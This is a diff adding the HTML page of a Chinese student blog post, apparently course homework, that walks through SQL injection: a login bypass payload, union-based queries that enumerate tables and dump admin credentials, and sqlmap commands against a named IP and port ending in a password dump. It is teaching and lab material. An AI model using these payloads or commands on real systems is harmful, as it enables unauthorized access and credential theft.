@@ -1,0 +1,1059 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="SQL注入之万能密码漏洞第一道题是牵扯到了万能密码漏洞 用户名先输入个’ 返回了sql报错语句,猜测存在sql注入漏洞  使用万能密码测试 登陆成功  原理假设登录框处的判断代码如下： 1SELECT * FROM admin where name=&apos;&quot;.$_POST[&apos;name&apos;].&quot;&apos;and password=&apos;&quot;.$_POST[&apos;password&apos;]&quot;&apos;; 在账号框中输入admin&amp;#39;">
+<meta name="keywords" content="SQL注入知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="信息安全概论课堂作业">
+<meta property="og:url" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/index.html">
+<meta property="og:site_name" content="张灵灵的笔记">
+<meta property="og:description" content="SQL注入之万能密码漏洞第一道题是牵扯到了万能密码漏洞 用户名先输入个’ 返回了sql报错语句,猜测存在sql注入漏洞  使用万能密码测试 登陆成功  原理假设登录框处的判断代码如下： 1SELECT * FROM admin where name=&apos;&quot;.$_POST[&apos;name&apos;].&quot;&apos;and password=&apos;&quot;.$_POST[&apos;password&apos;]&quot;&apos;; 在账号框中输入admin&amp;#39;">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/01.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/02.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/03.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/04.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/001.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/002.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/003.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/004.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/005.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/006.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/7.png">
+<meta property="og:updated_time" content="2019-10-14T01:16:40.127Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="信息安全概论课堂作业">
+<meta name="twitter:description" content="SQL注入之万能密码漏洞第一道题是牵扯到了万能密码漏洞 用户名先输入个’ 返回了sql报错语句,猜测存在sql注入漏洞  使用万能密码测试 登陆成功  原理假设登录框处的判断代码如下： 1SELECT * FROM admin where name=&apos;&quot;.$_POST[&apos;name&apos;].&quot;&apos;and password=&apos;&quot;.$_POST[&apos;password&apos;]&quot;&apos;; 在账号框中输入admin&amp;#39;">
+<meta name="twitter:image" content="http://yoursite.com/2019/10/13/信息安全概论课堂作业/01.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2019/10/13/信息安全概论课堂作业/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>信息安全概论课堂作业 | 张灵灵的笔记</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">张灵灵的笔记</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tools">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tools/" rel="section"><i class="menu-item-icon fa fa-fw fa-users"></i> <br>tools</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/13/信息安全概论课堂作业/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content>
+      <meta itemprop="description" content="夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="张灵灵的笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">信息安全概论课堂作业
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-10-13 20:57:00" itemprop="dateCreated datePublished" datetime="2019-10-13T20:57:00+08:00">2019-10-13</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-10-14 09:16:40" itemprop="dateModified" datetime="2019-10-14T09:16:40+08:00">2019-10-14</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/学习笔记/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SQL注入之万能密码漏洞"><a href="#SQL注入之万能密码漏洞" class="headerlink" title="SQL注入之万能密码漏洞"></a>SQL注入之万能密码漏洞</h1><p>第一道题是牵扯到了万能密码漏洞</p>
+<p>用户名先输入个’<br><img src="/2019/10/13/信息安全概论课堂作业/01.png" alt="你想输入的替代文字"></p>
+<p>返回了sql报错语句,猜测存在sql注入漏洞</p>
+<p><img src="/2019/10/13/信息安全概论课堂作业/02.png" alt="你想输入的替代文字"></p>
+<p>使用万能密码测试<br><img src="/2019/10/13/信息安全概论课堂作业/03.png" alt="你想输入的替代文字"></p>
+<p>登陆成功</p>
+<p><img src="/2019/10/13/信息安全概论课堂作业/04.png" alt="你想输入的替代文字"></p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>假设登录框处的判断代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin where name=<span class="string">'".$_POST['</span>name<span class="string">']."'</span><span class="keyword">and</span> password=<span class="string">'".$_POST['</span>password<span class="string">']"'</span>;</span><br></pre></td></tr></table></figure>
+<p>在账号框中输入<code>admin&#39;or 1=1 #</code>，密码随便输，sql语句就变成了：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin where name=<span class="string">'admin'</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">#'and password='任意字符';</span></span><br></pre></td></tr></table></figure>
+<p>  符号’将语句闭合</p>
+<p>  #号将<code>admin&#39; or 1=1</code>后面的语句注释</p>
+<p>  剩下有效的sql代码变成了</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin where name=<span class="string">'admin'</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+<p>  这段代码意思就是 ‘admin’ or 1=1 (真 or 真)是一个恒为真的判断</p>
+<p>  服务器收到了返回真的验证,就绕过了登录</p>
+<h2 id="防止方法"><a href="#防止方法" class="headerlink" title="防止方法"></a>防止方法</h2><p>  1.字符转义 </p>
+<p>  2.字符替换  </p>
+<p>  3.百度如何预防SQL注入</p>
+<h1 id="SQL注入之字符型注入"><a href="#SQL注入之字符型注入" class="headerlink" title="SQL注入之字符型注入"></a>SQL注入之字符型注入</h1><h2 id="利用手动注入"><a href="#利用手动注入" class="headerlink" title="利用手动注入"></a>利用手动注入</h2><p>  打开网站看到网址有个id参数</p>
+<p><img src="/2019/10/13/信息安全概论课堂作业/001.png" alt="你想输入的替代文字"></p>
+<h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>输入<code>id=1 and 1=1#</code>  页面正常</p>
+<p>输入<code>id=1 and 1=2#</code>  页面出现异常</p>
+<p>猜测为数字型注入</p>
+<h3 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h3><p>输入<code>id=1 order by 2#</code> 页面正常</p>
+<p>输入<code>id=1 order by 3#</code> 页出出现异常</p>
+<p>得知有两个字段</p>
+<h3 id="判断字段回显位置"><a href="#判断字段回显位置" class="headerlink" title="判断字段回显位置"></a>判断字段回显位置</h3><p>输入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>查看字段位置</p>
+<p><img src="/2019/10/13/信息安全概论课堂作业/002.png" alt="你想输入的替代文字"></p>
+<h3 id="查看数据库名字"><a href="#查看数据库名字" class="headerlink" title="查看数据库名字"></a>查看数据库名字</h3><p>输入<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">6666</span> union select <span class="number">1</span>,database()<span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>出现数据库名字：<code>maoshe</code></p>
+<p><img src="/2019/10/13/信息安全概论课堂作业/003.png" alt="你想输入的替代文字"></p>
+<h3 id="查看表名"><a href="#查看表名" class="headerlink" title="查看表名"></a>查看表名</h3><p>输入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=id=<span class="number">6666</span> union select <span class="number">1</span>,group_concat(table_name) from information_schema.tables where table_schema=database()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>出现了很多表名</p>
+<p><img src="/2019/10/13/信息安全概论课堂作业/004.png" alt="你想输入的替代文字"></p>
+<h3 id="查看字段名"><a href="#查看字段名" class="headerlink" title="查看字段名"></a>查看字段名</h3><p>我们需要的是admin表</p>
+<p>输入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">6666</span> union select <span class="number">1</span>,group_concat(column_name) from information_schema.columns where table_name=<span class="string">'admin'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>看到了字段名id、username、password</p>
+<p>  <img src="/2019/10/13/信息安全概论课堂作业/005.png" alt="你想输入的替代文字"></p>
+<h3 id="查看字段里的数据"><a href="#查看字段里的数据" class="headerlink" title="查看字段里的数据"></a>查看字段里的数据</h3><p>输入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">6666</span> union select <span class="number">1</span>,group_concat(id,<span class="string">":"</span>,username,<span class="string">":"</span>,password) from admin<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>看到了管理员用户名和密码</p>
+<p>  <img src="/2019/10/13/信息安全概论课堂作业/006.png" alt="你想输入的替代文字"></p>
+<h2 id="利用sqlmap工具注入"><a href="#利用sqlmap工具注入" class="headerlink" title="利用sqlmap工具注入"></a>利用sqlmap工具注入</h2><h3 id="检查注入点："><a href="#检查注入点：" class="headerlink" title="检查注入点："></a>检查注入点：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span> --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/13/信息安全概论课堂作业/1.png" alt="你想输入的替代文字"></p>
+<p><img src="/2019/10/13/信息安全概论课堂作业/2.png" alt="你想输入的替代文字"></p>
+<h3 id="爆数据库的信息："><a href="#爆数据库的信息：" class="headerlink" title="爆数据库的信息："></a>爆数据库的信息：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span> --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/13/信息安全概论课堂作业/3.png" alt="你想输入的替代文字"></p>
+<h3 id="爆当前数据库信息："><a href="#爆当前数据库信息：" class="headerlink" title="爆当前数据库信息："></a>爆当前数据库信息：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span> --current-db</span><br><span class="line">``` </span><br><span class="line"> ![你想输入的替代文字](信息安全概论课堂作业/<span class="number">4.</span>png)</span><br><span class="line"> </span><br><span class="line"><span class="comment">### 指定库名列出所有表</span></span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span>  -D maoshe --table</span><br></pre></td></tr></table></figure>
+<p> <img src="/2019/10/13/信息安全概论课堂作业/5.png" alt="你想输入的替代文字"></p>
+<h3 id="指定库名表名列出所有字段"><a href="#指定库名表名列出所有字段" class="headerlink" title="指定库名表名列出所有字段"></a>指定库名表名列出所有字段</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span>  -D maoshe -T admin --column</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/10/13/信息安全概论课堂作业/6.png" alt="你想输入的替代文字"></p>
+<h3 id="指定库名表名字段dump出指定字段"><a href="#指定库名表名字段dump出指定字段" class="headerlink" title="指定库名表名字段dump出指定字段"></a>指定库名表名字段dump出指定字段</h3><pre><code class="php">python .\sqlmap.py -u <span class="string">'http://59.63.200.79:8003/?id=1'</span>  -D maoshe -T admin -C username password --dump
+</code></pre>
+<p><img src="/2019/10/13/信息安全概论课堂作业/7.png" alt="你想输入的替代文字"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQL注入知识/" rel="tag"># SQL注入知识</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/23/“中国网安•深思杯”第八届山东省大学生网络安全技能大赛选拔赛Misc题目Write-up/" rel="next" title="“中国网安•深思杯”第八届山东省大学生网络安全技能大赛选拔赛Misc题目Write up">
+                <i class="fa fa-chevron-left"></i> “中国网安•深思杯”第八届山东省大学生网络安全技能大赛选拔赛Misc题目Write up
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/14/AWD笔记/" rel="prev" title="AWD笔记">
+                AWD笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC80NzA3MC8yMzU3MA=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt>
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <div class="site-description motion-element" itemprop="description">夏天,那个夏天,还有那个夏天,即使经历无数次夏天,我还是说不出口。</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">39</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.ak6666.top/" title="http://blog.ak6666.top/" rel="noopener" target="_blank">阿凯</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="298" height="52" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=32"></iframe>
+
+
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入之万能密码漏洞"><span class="nav-number">1.</span> <span class="nav-text">SQL注入之万能密码漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防止方法"><span class="nav-number">1.2.</span> <span class="nav-text">防止方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL注入之字符型注入"><span class="nav-number">2.</span> <span class="nav-text">SQL注入之字符型注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用手动注入"><span class="nav-number">2.1.</span> <span class="nav-text">利用手动注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#判断注入类型"><span class="nav-number">2.1.1.</span> <span class="nav-text">判断注入类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断字段数"><span class="nav-number">2.1.2.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断字段回显位置"><span class="nav-number">2.1.3.</span> <span class="nav-text">判断字段回显位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看数据库名字"><span class="nav-number">2.1.4.</span> <span class="nav-text">查看数据库名字</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看表名"><span class="nav-number">2.1.5.</span> <span class="nav-text">查看表名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看字段名"><span class="nav-number">2.1.6.</span> <span class="nav-text">查看字段名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查看字段里的数据"><span class="nav-number">2.1.7.</span> <span class="nav-text">查看字段里的数据</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用sqlmap工具注入"><span class="nav-number">2.2.</span> <span class="nav-text">利用sqlmap工具注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检查注入点："><span class="nav-number">2.2.1.</span> <span class="nav-text">检查注入点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆数据库的信息："><span class="nav-number">2.2.2.</span> <span class="nav-text">爆数据库的信息：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆当前数据库信息："><span class="nav-number">2.2.3.</span> <span class="nav-text">爆当前数据库信息：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指定库名表名列出所有字段"><span class="nav-number">2.2.4.</span> <span class="nav-text">指定库名表名列出所有字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指定库名表名字段dump出指定字段"><span class="nav-number">2.2.5.</span> <span class="nav-text">指定库名表名字段dump出指定字段</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div> 
+   
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<span id="busuanzi_container_site_pv">
+    <br>本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2019/10/13/信息安全概论课堂作业/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
